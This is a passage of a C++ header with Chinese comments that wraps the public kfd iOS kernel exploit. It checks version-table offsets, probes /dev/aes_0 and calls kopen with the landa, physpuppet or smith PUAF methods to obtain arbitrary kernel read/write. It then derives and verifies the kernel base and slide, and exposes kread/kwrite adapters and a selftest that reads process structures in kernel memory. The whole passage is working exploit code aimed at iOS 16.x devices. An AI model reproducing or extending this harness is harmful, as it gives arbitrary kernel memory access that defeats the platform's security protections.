        printf("[kfd]   vendor/kfd161/libkfd/info/dynamic_info.h 的 kern_versions[] 里加一条，\n");
        printf("[kfd]   三个字段（kern_version / device_id / build_id）都要能逐字对上。\n");
        return false;
    }

    const struct dynamic_info& di = kern_versions[hit.index];
    printf("[kfd] 版本表命中：[%d] pass=%d（0=三字段全等 1=版本+机型 2=只比版本）\n",
           hit.index, hit.pass);
    printf("[kfd]   kern_version = %s\n", nz(di.kern_version));
    printf("[kfd]   device_id    = %s（本机 %s，一致=%s）\n",
           nz(di.device_id), have_hw ? machine : "?", hit.device_matches ? "是" : "否");
    printf("[kfd]   os_version   = %s\n", nz(di.os_version));
    printf("[kfd]   build_id     = %s（本机 %s，一致=%s）\n",
           nz(di.build_id), have_os ? os_version : "?", hit.build_matches ? "是" : "否");
    if (!hit.build_matches) {
        printf("[kfd] 注意：build 不一致。kfd 的 info.h:111 第一轮会因为 build 不同而跳过本条，\n");
        printf("[kfd]       退到 info.h:131 的第二轮（只比版本+机型）才会选中同版本的另一条。\n");
        printf("[kfd]       同版本的兄弟条目偏移通常相同，但这属于要眼见为实的事情，\n");
        printf("[kfd]       下面会打印 kfd 自己最终选中的 vid 供核对。\n");
    }

    // ---- 5. 表条目完整性门禁 ----
    // 这些字段是 perf_run / info_run / find_proc 真正会用的量，缺一个就会读到错地方。
    // 注意 pmap__tte / proc__p_list__le_next / vm_map_entry__links__prev 的合法值就是 0x0，
    // 所以它们不进"非零检查"清单。
    struct FieldReq {
        const char* name;
        uint64_t    value;
    };
    const FieldReq req_fields[] = {
        { "fileglob__fg_ops",                 di.fileglob__fg_ops },
        { "fileops__fo_kqfilter",             di.fileops__fo_kqfilter },
        { "fileproc_guard__fpg_guard",        di.fileproc_guard__fpg_guard },
        { "proc__p_list__le_prev",            di.proc__p_list__le_prev },
        { "proc__p_pid",                      di.proc__p_pid },
        { "proc__p_fd__fd_ofiles",            di.proc__p_fd__fd_ofiles },
        { "proc__object_size",                di.proc__object_size },
        { "pseminfo__psem_usecount",          di.pseminfo__psem_usecount },
        { "pseminfo__psem_uid",               di.pseminfo__psem_uid },
        { "pseminfo__psem_semobject",         di.pseminfo__psem_semobject },
        { "semaphore__owner",                 di.semaphore__owner },
        { "specinfo__si_rdev",                di.specinfo__si_rdev },
        { "task__map",                        di.task__map },
        { "task__object_size",                di.task__object_size },
        { "vnode__v_un__vu_specinfo",         di.vnode__v_un__vu_specinfo },
        { "_vm_map__pmap",                    di._vm_map__pmap },
        { "kernelcache__kernel_base",         di.kernelcache__kernel_base },
        { "kernelcache__cdevsw",              di.kernelcache__cdevsw },
        { "kernelcache__gPhysBase",           di.kernelcache__gPhysBase },
        { "kernelcache__gPhysSize",           di.kernelcache__gPhysSize },
        { "kernelcache__gVirtBase",           di.kernelcache__gVirtBase },
        { "kernelcache__perfmon_devices",     di.kernelcache__perfmon_devices },
        { "kernelcache__perfmon_dev_open",    di.kernelcache__perfmon_dev_open },
        { "kernelcache__ptov_table",          di.kernelcache__ptov_table },
        { "kernelcache__vn_kqfilter",         di.kernelcache__vn_kqfilter },
    };
    bool fields_ok = true;
    for (size_t i = 0; i < sizeof(req_fields) / sizeof(req_fields[0]); i++) {
        if (req_fields[i].value == 0) {
            printf("[kfd] 表条目缺字段 %s = 0 → 不调用 kopen（用 0 偏移去读会读到垃圾，甚至改错地方）\n",
                   req_fields[i].name);
            fields_ok = false;
        }
    }
    if (!fields_ok) return false;

    // ---- 6. 方法支持门禁（等价于上游的"版本支持标志"，见 method_supported_by_entry 注释）----
    if (!method_supported_by_entry(di, method_in)) return false;

    // ---- 7. /dev/aes_0 探测门禁 ----
    // perf_init 里是 open("/dev/aes_0", O_RDWR) 然后 assert(fd > 0)（perf.h:82-83）。
    // 这一版没有 perf_supported 开关，perf_run 是无条件跑的，所以这一步必须先探。
    // fopen("r+b") 走的也是 O_RDWR（不创建），与其后 kfd 自己的 open 等价；
    // 探测完立刻 fclose，不占着 fd。
    {
        FILE* probe = fopen("/dev/aes_0", "r+b");
        if (!probe) {
            printf("[kfd] /dev/aes_0 打不开（O_RDWR）→ 不调用 kopen\n");
            printf("[kfd]   原因：perf.h:82-83 直接 open 再 assert(fd > 0)，失败即 abort；\n");
            printf("[kfd]         而 slide / ptov_table / TTBR / shared_page 全挂在 perf 上。\n");
            printf("[kfd]   常见前提：无沙盒 + 足够权限的运行形态（TrollStore 形态最稳）。\n");
            return false;
        }
        fclose(probe);
        printf("[kfd] /dev/aes_0 O_RDWR 探测通过\n");
    }

    // ---- 8. maxfilesperproc 门禁 ----
    if (!have_mf) {
        printf("[kfd] 读不到 kern.maxfilesperproc → 不做 spray 宽度假设 → 不调用 kopen\n");
        return false;
    }
    if (maxfiles < kMaxFilesFloor) {
        printf("[kfd] maxfilesperproc=%llu 太小（下限 %llu）→ 不调用 kopen\n",
               (unsigned long long)maxfiles,
               (unsigned long long)kMaxFilesFloor);
        printf("[kfd]   原因：kread_sem_open.h:15 用 maxfilesperproc - 100 当 spray 上限，\n");
        printf("[kfd]         太小会 u64 下溢 / 铺不满对象，krkw.h:205-213 会 assert_false 直接 abort。\n");
        return false;
    }
    if (maxfiles < kMaxFilesComfort) {
        printf("[kfd] 警告：maxfilesperproc=%llu 偏低（舒适线 %llu），sem_open 那条路径的 spray 空间窄，\n",
               (unsigned long long)maxfiles,
               (unsigned long long)kMaxFilesComfort);
        printf("[kfd]       失败概率上升。有条件先抬高 kern.maxfilesperproc。\n");
    }

    // ---- 9. kread/kwrite 方法组合 ----
    // 这一版的硬约束只有一条，但它不能违反：
    //   kwrite_sem_open 是**完全寄生**在 kread_sem_open 上的 ——
    //     kwrite_sem_open.h:8-15  直接复用 kread 的 krkw_maximum_id 与 krkw_method_data
    //     kwrite_sem_open.h:31-35 / 41-43  allocate/search/kwrite 全部转发给 kread_sem_open_* 与 kwrite_dup_*
    //   也就是说 kread 不走 sem_open 时，kwrite_sem_open 就没有可用的 psemnode 对象 → 建链必崩。
    // 所以本文件固定这一对；官方示例与 Picasso 在 16.x 上用的也是这一对。
    const uint64_t kread_m  = (uint64_t)kread_sem_open;
    const uint64_t kwrite_m = (uint64_t)kwrite_sem_open;

    printf("[kfd] puaf 方法      = %d -> %s（枚举值 %llu）\n",
           method_in, puaf_name, (unsigned long long)puaf_enum);
    printf("[kfd] kread 方法     = kread_sem_open（枚举值 %llu）\n", (unsigned long long)kread_m);
    printf("[kfd] kwrite 方法    = kwrite_sem_open（枚举值 %llu）\n", (unsigned long long)kwrite_m);
    printf("[kfd] puaf_pages     = %llu\n", (unsigned long long)puaf_pages);

    // 打印本条目里最关键的偏移，后面所有地址运算都以这些为准。
    printf("[kfd] 条目偏移：proc__p_pid=0x%llx proc__p_list__le_prev=0x%llx "
           "proc__p_fd__fd_ofiles=0x%llx proc__object_size=0x%llx\n",
           (unsigned long long)di.proc__p_pid,
           (unsigned long long)di.proc__p_list__le_prev,
           (unsigned long long)di.proc__p_fd__fd_ofiles,
           (unsigned long long)di.proc__object_size);
    printf("[kfd] 条目偏移：task__map=0x%llx task__itk_space=0x%llx task__object_size=0x%llx "
           "thread__thread_id=0x%llx pmap__tte=0x%llx pmap__ttep=0x%llx\n",
           (unsigned long long)di.task__map,
           (unsigned long long)di.task__itk_space,
           (unsigned long long)di.task__object_size,
           (unsigned long long)di.thread__thread_id,
           (unsigned long long)di.pmap__tte,
           (unsigned long long)di.pmap__ttep);
    printf("[kfd] 条目符号：kernelcache__kernel_base=0x%llx kernelcache__vn_kqfilter=0x%llx\n",
           (unsigned long long)di.kernelcache__kernel_base,
           (unsigned long long)di.kernelcache__vn_kqfilter);

    // ---- 10. 调用 kopen ----
    printf("[kfd] 调用 kopen(puaf_pages=%llu, puaf_method=%llu, kread_method=%llu, kwrite_method=%llu)\n",
           (unsigned long long)puaf_pages,
           (unsigned long long)puaf_enum,
           (unsigned long long)kread_m,
           (unsigned long long)kwrite_m);
    printf("[kfd] 提醒：kopen 内部任何一处 assert 触发都会 abort（kfd161 把 sleep(30)+exit(1)\n");
    printf("[kfd]       那段重定义注释掉了，见 common.h:113-130）。上面的门禁就是为了不走到那里。\n");

    const u64 h = kopen((u64)puaf_pages, (u64)puaf_enum, (u64)kread_m, (u64)kwrite_m);
    if (h == 0) {
        printf("[kfd] kopen 返回 0 → 失败。已经退回调用方（进程还活着说明走的是返回路径）\n");
        return false;
    }

    handle = (uint64_t)h;
    method = method_in;
    ok = true;

    // ---- 11. 成功后的后置校验：kfd 自己解析出来的关键字段必须都在 ----
    const struct kfd* k = reinterpret_cast<const struct kfd*>(static_cast<uintptr_t>(handle));

    printf("[kfd] kopen 成功，handle=0x%llx\n", (unsigned long long)handle);
    printf("[kfd]   env: pid=%d vid=%llu maxfilesperproc=%llu\n",
           (int)k->info.env.pid,
           (unsigned long long)k->info.env.vid,
           (unsigned long long)k->info.env.maxfilesperproc);
    printf("[kfd]   kfd 自己选中的 vid = %llu（本文件预检命中的是 %d）\n",
           (unsigned long long)k->info.env.vid, hit.index);
    printf("[kfd]   current_proc=0x%llx current_task=0x%llx\n",
           (unsigned long long)k->info.kaddr.current_proc,
           (unsigned long long)k->info.kaddr.current_task);
    printf("[kfd]   kernel_proc =0x%llx kernel_task =0x%llx\n",
           (unsigned long long)k->info.kaddr.kernel_proc,
           (unsigned long long)k->info.kaddr.kernel_task);
    printf("[kfd]   kernel_slide=0x%llx\n", (unsigned long long)k->perf.kernel_slide);

    if (k->info.env.vid >= (u64)table_count()) {
        printf("[kfd] 后置校验失败：kfd 选的 vid=%llu 越界（表只有 %zu 条）→ kclose 并返回 false\n",
               (unsigned long long)k->info.env.vid, table_count());
        ::kclose(handle);
        handle = 0;
        method = -1;
        ok = false;
        return false;
    }
    if (k->info.kaddr.current_proc == 0) {
        printf("[kfd] 后置校验失败：current_proc=0（find_proc 没跑成）→ kclose 并返回 false\n");
        ::kclose(handle);
        handle = 0;
        method = -1;
        ok = false;
        return false;
    }
    if (k->kread.krkw_method_ops.kread != perf_kread ||
        k->kwrite.krkw_method_ops.kwrite != perf_kwrite) {
        printf("[kfd] 警告：kread/kwrite 没有被换成 perf_*（perf.h:195-198 是预期的收尾动作）。\n");
        printf("[kfd]       这说明 perf_run 没走到最后一步：读还能用，写会走 sem_open 那条老路。\n");
        printf("[kfd]       先不要写内核，回头查 perf 链路。\n");
    } else {
        printf("[kfd] kread/kwrite 已切到 perf_* 通道（perf.h:195-198 校验通过）\n");
    }

    printf("[kfd] ==== 初始化成功 ====\n");
    return true;
}

// ---------------------------------------------------------------------------
// Client::kread_buf
// ---------------------------------------------------------------------------

inline bool Client::kread_buf(uint64_t kaddr, void* uaddr, uint64_t size) const {
    if (handle == 0 || !ok) {
        printf("[kfd] kread 失败：后端未初始化（init 没成功过）\n");
        return false;
    }
    if (kaddr == 0) {
        printf("[kfd] kread 失败：kaddr=0\n");
        return false;
    }
    if (!uaddr) {
        printf("[kfd] kread 失败：uaddr=NULL\n");
        return false;
    }
    if (size == 0) {
        printf("[kfd] kread 失败：size=0\n");
        return false;
    }
    if ((size % 8) != 0) {
        printf("[kfd] kread 失败：size=%llu 不是 8 的倍数。kread 内部按 u64 步进（krkw.h:8-16），\n",
               (unsigned long long)size);
        printf("[kfd]       余数字节会被静默丢掉 → 只读 8 的倍数，要 4 字节就按 8 字节读回来再截断。\n");
        return false;
    }
    if (size > kMaxTransferBytes) {
        printf("[kfd] kread 失败：size=%llu 超过单次上限 %llu（防手滑）\n",
               (unsigned long long)size, (unsigned long long)kMaxTransferBytes);
        return false;
    }

    // 成功路径不打印（一次遍历动辄上千次），第一次成功打一行，证明链路是通的。
    static bool logged_once = false;
    if (!logged_once) {
        printf("[kfd] 首次 kread：kaddr=0x%llx size=%llu（之后同类调用不再逐条打印）\n",
               (unsigned long long)kaddr, (unsigned long long)size);
        logged_once = true;
    }

    // 分片：perf_kread 单次最多 65535 字节（perf.h:14/21），超出会被 (u16) 静默截断。
    // 分片大小取 8 的倍数，所以每一片的起点仍然 8 字节对齐。
    uint8_t* out = (uint8_t*)uaddr;
    uint64_t done = 0;
    while (done < size) {
        uint64_t chunk = size - done;
        if (chunk > kKreadChunkMax) chunk = kKreadChunkMax;
        ::kread(handle, kaddr + done, (void*)(out + done), chunk);
        done += chunk;
    }
    return true;
}

// ---------------------------------------------------------------------------
// Client::kwrite_buf
// ---------------------------------------------------------------------------

inline bool Client::kwrite_buf(void* uaddr, uint64_t kaddr, uint64_t size) const {
    if (handle == 0 || !ok) {
        printf("[kfd] kwrite 失败：后端未初始化（init 没成功过）\n");
        return false;
    }
    if (kaddr == 0) {
        printf("[kfd] kwrite 失败：kaddr=0\n");
        return false;
    }
    if (!uaddr) {
        printf("[kfd] kwrite 失败：uaddr=NULL\n");
        return false;
    }
    if (size == 0) {
        printf("[kfd] kwrite 失败：size=0\n");
        return false;
    }
    if ((size % 8) != 0) {
        printf("[kfd] kwrite 失败：size=%llu 不是 8 的倍数（kwrite 内部按 u64 步进，kwrite_dup.h:65-68）\n",
               (unsigned long long)size);
        return false;
    }
    if (size > kMaxTransferBytes) {
        printf("[kfd] kwrite 失败：size=%llu 超过单次上限 %llu（防手滑）\n",
               (unsigned long long)size, (unsigned long long)kMaxTransferBytes);
        return false;
    }

    // 整字为 0 的写默认拒绝，理由见文件顶部第五节第 3 条：kopen 之后走的是 perf_kwrite，
    // 它把每个 8 字节值当 perfmon event number 送进 ioctl（perf.h:56-59），
    // 0 号 event 是否被内核接受未经真机验证，而 assert_bsd 一失败就是 abort。
    // 用 memcpy 逐字取，避免对未对齐的用户态缓冲做 u64 解引用（那是 UB）。
    if (!allow_zero_word_write) {
        const uint8_t* p = (const uint8_t*)uaddr;
        const uint64_t words = size / 8;
        for (uint64_t i = 0; i < words; i++) {
            uint64_t w = 0;
            memcpy(&w, p + (i * 8), sizeof(w));
            if (w == 0) {
                printf("[kfd] kwrite 失败：第 %llu 个 8 字节字是 0（addr=0x%llx）\n",
                       (unsigned long long)i,
                       (unsigned long long)(kaddr + (i * 8)));
                printf("[kfd]   perf_kwrite 把值当 perfmon event number 用，写 0 未经真机验证；\n");
                printf("[kfd]   确需写 0：先验证 event 0 的行为，再把 kfdb::allow_zero_word_write 置 true。\n");
                return false;
            }
        }
    }

    static bool logged_once = false;
    if (!logged_once) {
        printf("[kfd] 首次 kwrite：kaddr=0x%llx size=%llu。备份/回读校验由上层负责\n",
               (unsigned long long)kaddr, (unsigned long long)size);
        logged_once = true;
    }
    ::kwrite(handle, uaddr, kaddr, size);
    return true;
}

// ---------------------------------------------------------------------------
// Client::kernel_base
// ---------------------------------------------------------------------------

inline uint64_t Client::kernel_base() const {
    if (handle == 0 || !ok) {
        printf("[kfd] kernel_base 失败：后端未初始化\n");
        return 0;
    }

    const struct kfd* k = reinterpret_cast<const struct kfd*>(static_cast<uintptr_t>(handle));
    const uint64_t vid = (uint64_t)k->info.env.vid;
    if (vid >= (uint64_t)table_count()) {
        printf("[kfd] kernel_base 失败：env.vid=%llu 越界（表只有 %zu 条）\n",
               (unsigned long long)vid, table_count());
        return 0;
    }
    const struct dynamic_info& di = kern_versions[vid];

    // 1) 条目里没有静态基址 → 连"该拿什么去加"都不知道
    if (di.kernelcache__kernel_base == 0) {
        printf("[kfd] kernel_base 失败：条目 [%llu] 的 kernelcache__kernel_base = 0\n",
               (unsigned long long)vid);
        return 0;
    }
    // 2) slide 为 0 = perf_run 没跑到最后（perf.h:99-101 会把 slide 写进去）
    const uint64_t slide = (uint64_t)k->perf.kernel_slide;
    if (slide == 0) {
        printf("[kfd] kernel_base 失败：perf.kernel_slide=0（perf_run 没走到，\n");
        printf("[kfd]   常见原因是 /dev/aes_0 打不开或 perfmon ioctl 被拦）\n");
        return 0;
    }

    // 3) base = 静态基址 + slide（与 perf.h:100 完全同一行）
    const uint64_t base = di.kernelcache__kernel_base + slide;

    // 4) 校验：base 处 4 字节必须是 Mach-O 64 magic 0xfeedfacf。
    //    按 8 字节读回来取低 32 位（arm64 小端；kread 要求 8 的倍数）。
    uint64_t word = 0;
    if (!kread_buf(base, &word, (uint64_t)sizeof(word))) {
        printf("[kfd] kernel_base 失败：读 base=0x%llx 处的头没成功\n", (unsigned long long)base);
        return 0;
    }
    const uint32_t magic = (uint32_t)(word & 0xffffffffull);
    if (magic != kMachOMagic64) {
        printf("[kfd] kernel base 校验失败：base=0x%llx 处 magic=0x%08x（期望 0x%08x）→ 不返回这个地址\n",
               (unsigned long long)base, (unsigned)magic, (unsigned)kMachOMagic64);
        return 0;
    }

    printf("[kfd] kernel base = 0x%llx（slide=0x%llx，magic 0x%08x 校验通过）\n",
           (unsigned long long)base,
           (unsigned long long)slide,
           (unsigned)magic);
    return base;
}

inline bool Client::read_kernel_base(uint64_t* out_base) const {
    if (out_base) *out_base = 0;
    if (!out_base) {
        printf("[kfd] read_kernel_base 失败：出参为 NULL\n");
        return false;
    }
    const uint64_t base = kernel_base();
    if (base == 0) return false;
    *out_base = base;
    return true;
}

// ---------------------------------------------------------------------------
// Client::shutdown
// ---------------------------------------------------------------------------

inline void Client::shutdown() {
    if (handle == 0) {
        printf("[kfd] shutdown：当前没有句柄，什么都不做\n");
        ok = false;
        method = -1;
        return;
    }
    printf("[kfd] shutdown：调用 kclose(0x%llx)\n", (unsigned long long)handle);
    ::kclose(handle);
    printf("[kfd] shutdown：完成（perf 的 fd / shared_page 与 PUAF、KRKW 对象都已释放）\n");
    handle = 0;
    method = -1;
    ok = false;
}

// ---------------------------------------------------------------------------
// 纯读取值：kfd 已经把 current_proc / kernel_proc 解析好了，直接用
// （find_proc 在 kread_sem_open.h:95-115，info_run 在 info.h:146-218）
// ---------------------------------------------------------------------------

inline uint64_t Client::kernel_proc() const {
    if (handle == 0) return 0;
    const struct kfd* k = reinterpret_cast<const struct kfd*>(static_cast<uintptr_t>(handle));
    return (uint64_t)k->info.kaddr.kernel_proc;
}

inline uint64_t Client::current_proc() const {
    if (handle == 0) return 0;
    const struct kfd* k = reinterpret_cast<const struct kfd*>(static_cast<uintptr_t>(handle));
    return (uint64_t)k->info.kaddr.current_proc;
}

inline uint64_t Client::current_task() const {
    if (handle == 0) return 0;
    const struct kfd* k = reinterpret_cast<const struct kfd*>(static_cast<uintptr_t>(handle));
    return (uint64_t)k->info.kaddr.current_task;
}

inline uint64_t Client::kernel_slide() const {
    if (handle == 0) return 0;
    const struct kfd* k = reinterpret_cast<const struct kfd*>(static_cast<uintptr_t>(handle));
    return (uint64_t)k->perf.kernel_slide;
}

inline const struct dynamic_info* Client::entry() const {
    if (handle == 0) return nullptr;
    const struct kfd* k = reinterpret_cast<const struct kfd*>(static_cast<uintptr_t>(handle));
    const uint64_t vid = (uint64_t)k->info.env.vid;
    if (vid >= (uint64_t)table_count()) return nullptr;
    return &kern_versions[vid];
}

// ---------------------------------------------------------------------------
// selftest：一次把「命中版本 → kopen → base + magic → current_proc/kernel_proc → kclose」
// 走完。每一步都打 [kfd] 前缀的中文日志；任何一步不过就立刻收尾（不会留活句柄）。
// 默认用 landa（method=1）+ 2048 页：本机 16.1.1 早于 physpuppet/smith/landa 三者
// 的修复版本，三个都能选；landa 是 kfd 在 16.x 上最常用的那一档。
// ---------------------------------------------------------------------------

inline bool selftest(int method = 1, uint64_t puaf_pages = kDefaultPuafPages) {
    printf("[kfd] ======== selftest 开始 ========\n");

    Client c;
    if (!c.init(method, puaf_pages)) {
        printf("[kfd] selftest 失败：init 没通过（原因见上面日志）\n");
        printf("[kfd] ======== selftest 结束：FAIL ========\n");
        return false;
    }

    // 第 1 步：内核基址 + Mach-O magic（kernel_base 内部已校验，这里再打一遍）
    const uint64_t base = c.kernel_base();
    if (base == 0) {
        printf("[kfd] selftest 失败：kernel_base() 返回 0\n");
        c.shutdown();
        printf("[kfd] ======== selftest 结束：FAIL ========\n");
        return false;
    }

    // 第 2 步：current_proc + proc__p_pid 必须等于 getpid()（这一步才真正证明偏移对）
    const struct dynamic_info* di = c.entry();
    if (!di) {
        printf("[kfd] selftest 失败：拿不到版本条目（entry() 返回 nullptr）\n");
        c.shutdown();
        printf("[kfd] ======== selftest 结束：FAIL ========\n");
        return false;
    }

    const uint64_t cur_proc = c.current_proc();
    const uint64_t ker_proc = c.kernel_proc();
    printf("[kfd] selftest: current_proc = 0x%llx\n", (unsigned long long)cur_proc);
    printf("[kfd] selftest: kernel_proc  = 0x%llx\n", (unsigned long long)ker_proc);
    printf("[kfd] selftest: 用到的 proc__p_pid 偏移 = 0x%llx（条目 [%s]）\n",
           (unsigned long long)di->proc__p_pid, nz(di->build_id));

    if (cur_proc == 0) {
        printf("[kfd] selftest 失败：current_proc=0\n");
        c.shutdown();
        printf("[kfd] ======== selftest 结束：FAIL ========\n");
        return false;
    }

    bool ok = true;

    // 读自己 proc 的 p_pid（i32 放在低 32 位；按 8 字节读回来取低位）
    uint64_t word = 0;
    if (!c.kread_buf(cur_proc + di->proc__p_pid, &word, (uint64_t)sizeof(word))) {
        printf("[kfd] selftest 失败：读 current_proc->p_pid 的调用没发出\n");
        ok = false;
    } else {
        const int32_t pid_read = (int32_t)(word & 0xffffffffull);
        const int32_t pid_real = (int32_t)getpid();
        printf("[kfd] selftest: 读回 p_pid = %d，本进程 getpid() = %d\n", (int)pid_read, (int)pid_real);
        if (pid_read != pid_real) {
            printf("[kfd] selftest 失败：p_pid 对不上 —— 说明 proc 偏移或 slide 不对，禁止继续写内核\n");
            ok = false;
        } else {
            printf("[kfd] selftest: p_pid 校验通过（proc 偏移可用）\n");
        }
    }

    // 第 3 步：kernel_proc 的 p_pid 应当是 0（launchd 内核 task 的 proc）。
    // 这一条是"独立第二证据"，和 getpid() 那条互相印证。
    if (ker_proc != 0) {
        uint64_t kw = 0;
        if (!c.kread_buf(ker_proc + di->proc__p_pid, &kw, (uint64_t)sizeof(kw))) {
            printf("[kfd] selftest 警告：读 kernel_proc->p_pid 的调用没发出\n");
        } else {
            const int32_t kpid = (int32_t)(kw & 0xffffffffull);
            printf("[kfd] selftest: kernel_proc->p_pid = %d（期望 0）\n", (int)kpid);
            if (kpid != 0) {
                printf("[kfd] selftest 警告：kernel_proc 的 p_pid 不是 0 —— 偏移链可疑，先别写内核\n");
            }
        }
    } else {
        printf("[kfd] selftest 警告：kernel_proc=0（find_proc 只回了 current_proc）\n");
    }

    // 收尾：无论成败都 kclose，避免把 PUAF 状态留在进程里
    c.shutdown();
    printf("[kfd] ======== selftest 结束：%s ========\n", ok ? "PASS" : "FAIL");
    return ok;
}

// ---------------------------------------------------------------------------
// 接进 kback::Ops 用的适配层
//
// KernelBackend.h:21-39 的 Ops 里全是"无上下文参数的函数指针"
// （bool (*)(uint64_t, void*, size_t) 这种），没法带 this，所以只能用单例。
// 这里不 include KernelBackend.h —— 本文件的 include 清单是被限定的，
// 由调用方在自己那边 set_backend 时把下面这几个地址填进 kback::Ops 即可。
// ---------------------------------------------------------------------------

inline Client& shared() {
    static Client c;
    return c;
}

// 默认用 landa（0=physpuppet 1=landa 2=smith）
inline bool ops_init(void) {
    return shared().init(1);
}

inline bool ops_kread(uint64_t addr, void* out, size_t len) {
    return shared().kread_buf(addr, out, (uint64_t)len);
}

inline bool ops_kwrite(uint64_t addr, const void* in, size_t len) {
    return shared().kwrite_buf(const_cast<void*>(in), addr, (uint64_t)len);
}

inline uint64_t ops_kbase(void) {
    return shared().kernel_base();
}

} // namespace kfdb
